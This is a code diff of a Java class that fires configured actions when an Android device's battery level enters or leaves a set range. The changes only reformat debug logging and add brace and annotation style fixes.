@@ -20,11 +20,11 @@ import com.android.service.util.DataBuffer;
 
 public class EventBattery extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
-	private static final String TAG = "EventBattery";
+	private static final String TAG = "EventBattery"; //$NON-NLS-1$
 
 	private int actionOnExit, actionOnEnter, minLevel, maxLevel;
 	private boolean inRange = false;
-	
+
 	@Override
 	public void begin() {
 		ListenerBattery.self().attach(this);
@@ -42,16 +42,20 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 		final byte[] conf = event.getParams();
 
 		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-		
+
 		try {
 			actionOnEnter = event.getAction();
 			actionOnExit = databuffer.readInt();
 			minLevel = databuffer.readInt();
 			maxLevel = databuffer.readInt();
-			
-			if(Cfg.DEBUG) Check.log( TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			}
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
+			}
 			return false;
 		}
 		return true;
@@ -63,28 +67,35 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 	}
 
 	public int notification(Battery b) {
-		if(Cfg.DEBUG) Check.log( TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
-		
-		if (minLevel > maxLevel)
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Got battery notification: " + b.getBatteryLevel() + "%") ;//$NON-NLS-1$ //$NON-NLS-2$
+		}
+
+		if (minLevel > maxLevel) {
 			return 0;
-		
+		}
+
 		// Nel range
 		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
-			if(Cfg.DEBUG) Check.log( TAG + " Battery IN");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Battery IN") ;//$NON-NLS-1$
+			}
 			onEnter();
 		}
-     
+
 		// Fuori dal range
 		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
-			if(Cfg.DEBUG) Check.log( TAG + " Battery OUT");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Battery OUT") ;//$NON-NLS-1$
+			}
 			onExit();
 		}
-		
+
 		return 0;
 	}
-	
+
 	public void onEnter() {
 		trigger(actionOnEnter);
 	}
